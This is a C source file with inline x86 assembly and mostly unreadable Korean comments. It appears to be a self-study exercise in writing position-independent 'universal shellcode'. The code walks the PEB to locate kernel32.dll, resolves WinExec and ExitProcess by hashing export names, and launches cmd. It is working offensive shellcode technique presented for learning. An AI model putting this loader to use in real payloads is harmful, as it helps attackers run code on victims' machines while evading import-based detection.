
/*
bool define
*/
#include <stdio.h>
#include <windows.h>


#define TRUE 1
#define FALSE 0

/*
SW_SHOW value is for using WinExec API

UINT WinExec(
  LPCSTR lpCmdLine,
  UINT   uCmdShow
);

UINT: unsigned int
LPCSTR: long pointer constant string (const char *)
...

unsigned int WinExec(
	const char *lpCmdLine,
	unsigned int uCmdShow
);

*/
#define SW_SHOW 5

/*

purpose:		universal-shellcode
programmer:	woohyuk seo (������)
doc write date: 	12/19/2019
compiler: 	Visual Studio 2019 C++

universal shellcode�� kernel32.dll�� export�ϴ� �ּҰ� �Ź� �ٲ� call�ϴ� �ּҰ� ��ȿ���� �ʰԵȴ�
�������� ������� �Ϲ����� ���ڵ��� �Ѱ踦 �غ��ϱ� ���ؼ� ���������.

kenrel32.dll�� process�� mapping�Ǿ�����, �ش� kernel32.dll�� ������
�Լ��� �ּҸ� ����Ѵ�.

kernel32.dll�� mapping�� ���� PEB����Ѵ�.

����..

universal shellcode�� ����� ���ؼ� PEB(process environment block)�� ��ġ�� ���ؾ��Ѵ�.
PEB�� ��ġ�� ���ϴ� �������� fs register�� �̿��Ѵ�.

user mode�� fs register�� ���� ���μ����� TEB(thread environment block) �� ����Ű���ִ�.
kernel mode�� fs register�� KPCR (processor control region) �� ����Ű���ִ�. (�տ� �ٴ� K�� ���� kernel�� ���ڰ���.)
KPCR�� schedule info���� ����ȴ�. (����� ��������� ������, ť ����, ... ��� �Ѵ�.


fs:0x30��ġ�� PEB�� �����Ѵ�.
������ ������ ����.

typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  BYTE                          Reserved4[104];
  PVOID                         Reserved5[52];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved6[128];
  PVOID                         Reserved7[1];
  ULONG                         SessionId;
} PEB, *PPEB;

typedef struct _PEB_LDR_DATA {
  BYTE       Reserved1[8];	//sizeof(unsigned char) = 1,  sizeof(unsigned char) * 8 = 8
  PVOID      Reserved2[3];	//sizeof(void *) = 4, sizeof(void *) * 2 = 8

  //distance = (8 + 8 + 4) = 20 byte ( InMemoryOrderModuleList.Flink )

  LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

PEB���� (2 + 1 + 1 + 4 + 4 = 12) ��ŭ ���ϸ� PPEB_LDR_DATA Ldr (������ ����)�� �ּҰ� ����
Loade_export�� ����Ű�� �ּҿ���, (8 + (4 * 3) = 20)  ��ŭ ���ϸ� LIST_ENTRY InMemoryOrderModuleList �� �ּҰ� ����
InMemoryOrderModuleList �� ���߸�ũ�� ������ �ִ�.

������ ������ ����
.
typedef struct _LIST_ENTRY {
   struct _LIST_ENTRY *Flink;
   struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;

FLink�� Front Link, BLink�� Back Link��� ���� (�� ������ ��ũ�� NULL�� ����Ű������)


���� ��ũ�� LDR_DATA_TABLE_ENTRY�� ����Ű���ִ�.
LDR_DATA_TABLE_ENTRY�� �ش� ���μ����� �ε��� DLL�� ������ �������ִ�.

������ ������ ����.

typedef struct _LDR_DATA_TABLE_ENTRY {
	PVOID Reserved1[2];
	LIST_ENTRY InMemoryOrderLinks;
	PVOID Reserved2[2];
	PVOID DllBase;
	PVOID EntryPoint;
	PVOID Reserved3;
	UNICODE_STRING FullDllName;
	BYTE Reserved4[8];
	PVOID Reserved5[3];
	union {
		ULONG CheckSum;
		PVOID Reserved6;
	};
	ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

���⼭ �����ؾ� �� ����, Reserved1������� ������� �ʰ�, InMemoryOrderLinks���� ����Ͽ�,  ((4 * 2) + (4 * 2)) = 16byte��ŭ ���Ͽ� DllBase�� �����ؾ� �Ѵٴ� ���̴�.
������ InMemoryOrderLinks�� ���߸���Ʈ�̴�, �翬�� ���������, Front Link���� �����ɰ��̴�.
Front Link���� ���������� 32��Ʈȯ�濡���� �޸��ּ�ũ�� (4byte) 4�� �ڿ� DllBase�� �����Ѵ�.

DllBase�� mapping�� DLL�� �ּҸ� �������ִ�.

DllBase�� ����Ű�� �ּҸ� register�� ������Ű�� ����� �������� ����ؾ��Ѵ�.
mov�� ��������, ������ 4����Ʈ��ŭ �����Ѵ�. (movzx, movsx, movs)���� ����� 4����Ʈ���� ���ų�, ū ����Ʈ�� �����Ѵ�.
intel��������, 4����Ʈ �������� ǥ���� ������ ����. mov register, [register]
DllBase�� LPVOID���������� mov�� ����Ѵ�.

C�� �Լ�����, ebp �������ͷ� ���� ������ �����ϸ� �Լ����ڰ���, ������ �����ϸ� local variable area �� ���´�.

GetApiAddress �Լ��� ȣȯ���� �̽ļ��� ���ؼ� ���ܵд�.
int GetApiAddress(int ModuleAddress, const char* Name)
{
	int r = 0;

	__asm
	{
		mov edi, [ebp + 8]; //ModuleAddress

		//Image dos header
		//0x3C offset pointing value is 0xE8
		//0xE8 value means 'Offset to new EXE header' *(PE..)
		mov edi, [ebx + 0x3c];  //PE Header location
		add edi, ebx;			//add DllBase
		mov edi, [edi + 0x78];	//IMAGE_OPTIONAL_HEADER in Export Table RVA address
		add edi, ebx;			//add DllBase
		mov edx, edi;			//._export IMAGE_EXPORT_DIRECTORY

		mov [ebp - 12], edx;

	//get string hash

		xor eax, eax;
		xor ecx, ecx;

		xor esi, esi;

		mov ebx, [ebp + 12];

	_NAME_HASH:;
		movsx edx, byte ptr[ebx + ecx];
		add ecx, 1;
		add eax, edx;

		cmp edx, esi;
		jne _NAME_HASH;

		mov [ebp - 16], eax;


	//find api name

		mov eax, [ebp - 12];
		add eax, 32;
		mov eax, [eax];
		add eax, [ebp + 8];

		xor esi, esi;

	_LOOP:;
		mov ebx, [eax + esi * 4];
		add ebx, [ebp + 8];

		xor ecx, ecx;
		xor edi, edi;

	__LOOP:;
		movsx edx, byte ptr[ebx + ecx];

		add edi, edx;
		add ecx, 1;

		cmp edx, 0;
		jne __LOOP;

		cmp edi, [ebp - 16];
		je BREAK_LABLE;

		add esi, 1;

		jmp _LOOP;

	BREAK_LABLE:;

		//get ordinal number of the function

		mov ebx, [ebp - 12];
		add ebx, 36;
		mov ebx, [ebx];

		mov eax, 2;
		mov ecx, esi;
		mul ecx;

		add ebx, eax;
		add ebx, [ebp + 8];

		movsx edx, word ptr[ebx];

		//ordinal is started from one
		add edx, 1;

		//get function address
		mov ebx, [ebp - 12];
		add ebx, 28;
		mov ebx, [ebx];

		add ebx, [ebp + 8];

		mov eax, 4;
		mul edx;
		sub eax, 4;

		add ebx, eax;

		mov ebx, [ebx];
		add ebx, [ebp + 8];

		mov eax, ebx;
		mov r, ebx;
	}

	return r;
}
*/


/*
	example for calculating hash

	const char kernel32_string[] = "KERNEL32.DLL";
	int kernel32_string_hash = 0;

	for (int i = 0; kernel32_string[i] != 0; i++)
	{
		kernel32_string_hash += kernel32_string[i];
	}

	//kernel32_string_hash is 816 (decimal);
*/


void shellcode()
{	
	const int kernel32_string_hash = 816; //KERNEL32.DLL (Unicode string) hash value

	char shell[] = "cmd";
	char LpStrWinExec[] = "WinExec";
	char LpStrExitProcess[] = "ExitProcess";

	__asm
	{
		//eax �������Ϳ� PEB����
		mov eax, fs:0x30;

		//PEB�κ��� 12���� �ּҴ� LDR, �������� ���ؼ� ����� ����
		mov eax, [eax + 12];
		//������� 20��ŭ ���ϸ�, LIST_ENTRY InMemoryOrderModuleList�̴�. �������� ���ؼ� Flink�� �����Ѵ�.
		mov eax, [eax + 20];

		//kernel32����
	get_next_front_link:;

		//FLINK�� ���ؼ� entry�� �����Ѵ�. 
		//doubly linked list������ �������� ���ؼ� ���� entry�� �����Ҽ��ִ�.

		mov eax, [eax];

		//KERNEL32.DLL ���ڿ����� ���� �ؽ����� ���ؼ� ������ �����Ѵ�.
		//������ �����ڵ� ���ڿ� ����ü�̴�.

		/*
typedef struct _LSA_UNICODE_STRING {
	USHORT Length;			// + 36
	USHORT MaximumLength;	// + 38
	PWSTR  Buffer;			// + 40
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;
		*/

		//ebx holds DllNameLength
		//4 byte to 2 byte (USHORT Length)

		//Length ����� flink�� ���� �� entry�κ��� 36���� �ּҿ� �ִ�.
		//���ڿ��� ���̸� ���� ������, �����ڵ��̱� ������ ��Ȯ�� ���̸� ������ �ؽ��� �������Ѵ�.
		movsx ebx, word ptr[eax + 36];

		//DLL�� �̸��� �˾Ƴ����Ѵ�.
		//DLL�� �̸��� �ּҴ� flink�� ���� �� entry�κ��� ������ ���ϸ� ���´�.
		//40	 = name
		//40 - 8 = full path
		//�ʿ��� ����� name�̴�. 40�� ���ؼ� �̸����� ��´�.
		mov edx, [eax + 40];

		xor esi, esi;
		xor ecx, ecx;
		

	get_hash_lable:;

		//edi�� byte������ �ε��������� ���� �� �� ������ �����Ѵ�.
		movsx edi, byte ptr[edx + esi];	
		//hash (ecx)�� �� ���常ŭ ���Ѵ�.
		add ecx, edi;						

		//�ε����� ���Ѵ�.
		add esi, 1;	
		//���̿� �ε����� ���Ѵ�.
		cmp esi, ebx;
		//���̿� �ε����� ���� ������� �ݺ��Ѵ�.
		jne get_hash_lable;
		//���̿� �ε����� ������� �ݺ��� ������.

		//�� hash�� KERNEL32.DLL�� hash�� ���Ѵ�.
		cmp ecx, kernel32_string_hash; 
		//hash�� �ٸ���� ���� flink�� ���ؼ� ���� entry�� �����ؼ� KERNEL32.DLL�� hash���� ���� ���ڿ��� ���ö� ���� �ݺ��ϰԵȴ�.
		jne get_next_front_link;
		//hash�� ������� �ݺ������ʴ´�.
		
		//���������� ���� �ּ� (MZ)�� ���Ѵ�. flink�� �̿��� �� entry�� ���� 16���� �ּҿ� �ִ�.
		mov ebx, [eax + 16];
		//���ÿ� �����Ѵ�. 
		mov [ebp - 20], ebx;	//MZ

		//�Լ������� ���ؼ� ���ڵ� �������� �����Ѵ�.
		jmp START_CALL;

		//�Լ�����
	_GetApiAddress:;
		mov edi, [ebp + 8]; //KERNEL32�� �ּҰ� ����Ǿ��ִ�.

		/*
		Image Dos Header���� 0x3c�ּҴ� 0xe8�� ����Ű���ְ�, 0xe8�� �ǹ̴� 'PE header' �̴�.
		(������ PE �ñ״�ó�� �����Ѵ�.)
		PE header�� ù�κп���, 0x78��ŭ ���Ѵٸ� IMAGE_EXPORT_DIRECTORY�� RVA�� ���´�.
		*/
		mov edi, [ebx + 0x3c];  //PE Header location
		add edi, ebx;			//add DllBase
		mov edi, [edi + 0x78];	//IMAGE_OPTIONAL_HEADER in Export Table RVA address
		add edi, ebx;			//add DllBase
		mov edx, edi;			//._export IMAGE_EXPORT_DIRECTORY
		
		//���ÿ� EAT����
		mov[ebp - 12], edx;

		//ã������ API name�� ���� hash�� ���Ѵ�.
		xor eax, eax;
		xor ecx, ecx;

		xor esi, esi;

		//API name�� �ּҰ��� ebx�� ����
		mov ebx, [ebp + 12];

	_NAME_HASH:;
		//�ε����� ������ �ѹ����� edx�� ����
		movsx edx, byte ptr[ebx + ecx];
		//�ѹ��常ŭ eax�� ����
		add eax, edx;
		
		//�ε����� ����
		add ecx, 1;

		//esi == 0, NULL terminate string������, ���ڿ��� ���� Ȯ��.
		cmp edx, esi;
		//���ڿ��� ���϶� �ݺ��� ������.
		//eax�� hash���� ����.
		jne _NAME_HASH;

		//hash�� ���ÿ� ����.
		mov[ebp - 16], eax;


		//API export name����.
		//EAT ����
		mov eax, [ebp - 12];
		//EAT + 32�� Name Pointer Table
		add eax, 32;
		//�������� ���ؼ� Name Pointer Table�� ����
		mov eax, [eax];
		//RVA��������, VA�� ���Ͽ� Name Pointer Table�� �����ּҸ� ����.
		add eax, [ebp + 8];

		xor esi, esi;

	_LOOP:;
		//�ε����� �޸��ּҰ����� ��ȯ�ϴ� �����̴�.
		//�ε��� * 4 ������ ���Ͽ� ���ڿ��� �����ϴ� ������, �������� ũ�Ⱑ 4byte�̱� �����̴�
		mov ebx, [eax + esi * 4];
		//RVA���� ���ڿ��ּ�������, VA�� ���Ͽ� ���� ���ڿ� �ּҸ� ����.
		add ebx, [ebp + 8];
		//ebx�� API�̸� ���ڿ��� ����Ű������.

		xor ecx, ecx;
		xor edi, edi;

	__LOOP:;
		//edx�� �ε����� ���� ������ �� ���ڸ� ����������
		movsx edx, byte ptr[ebx + ecx];
		//edi�� edx�� ����
		add edi, edx;
		//���ڿ� �ε����� ����
		add ecx, 1;

		//null terminate string������, 0�� �ѹ��ڸ� ���ؼ� ���ڿ��� ���� �˾Ƴ�
		cmp edx, 0;
		jne __LOOP;
		//���ڿ��� ���϶� �ݺ��� ������.

		//ã������API �̸��� hash�� ���� �� API�̸��� hash�� ���Ѵ�.
		cmp edi, [ebp - 16];
		//������� �ݺ��� �����Ѵ�.
		je BREAK_LABLE;

		//�ٸ���� �ε����� ���Ѵ��� �ݺ��Ѵ�.
		add esi, 1;
		jmp _LOOP;

	BREAK_LABLE:;

		//�Ʒ������� Ordinal Table, Export Address Table�� �̿��ؼ� Export Function Address�� ��´�.
		//����ȭ�����ʾ���. ����ȭ�ʿ�

		//get ordinal number of the function
		mov ebx, [ebp - 12];
		add ebx, 36;
		mov ebx, [ebx];

		mov eax, 2;
		mov ecx, esi;
		mul ecx;

		add ebx, eax;
		add ebx, [ebp + 8];

		movsx edx, word ptr[ebx];

		//ordinal is started from one
		add edx, 1;

		//get function address
		mov ebx, [ebp - 12];
		add ebx, 28;
		mov ebx, [ebx];

		add ebx, [ebp + 8];

		mov eax, 4;
		mul edx;
		sub eax, 4;

		add ebx, eax;

		mov ebx, [ebx];
		add ebx, [ebp + 8];

		mov eax, ebx;
		ret;

		//���ڵ� ����
	START_CALL:;
		
		//GetModuleHandle, GetProcAddress�� ������ �Լ��� ���ؼ� kernel32.dll�� export function address�� ����.
		//������ ���ؼ� ���ڰ��� �����Ѵ�.

		//WinExec API�� �ּҸ� ��� ��������� �Լ� ȣ��
		//�����غ�
		mov eax, [ebp - 20];
		mov [ebp + 8], eax;
		lea ecx, [LpStrWinExec];
		mov[ebp + 12], ecx;
		//�Լ�ȣ��
		call _GetApiAddress;
		
		//export function address�� eax�� ����ȴ�.
		//WinExec APIȣ��
		push 5; //5 means SW_SHOW
		lea ebx, [shell];
		push ebx;
		call eax;

		//ExitProcess API�� �ּҸ� ��� ����� ���� �Լ� ȣ��
		//�����غ�
		mov ebx, [ebp - 20];
		mov[ebp + 8], ebx;
		lea ecx, [LpStrExitProcess];
		mov[ebp + 12], ecx;
		//�Լ�ȣ��
		call _GetApiAddress;

		//ExitProcess APIȣ��
		push 0;
		call eax;
	}
}


int main()
{
	shellcode();

	return 0;
}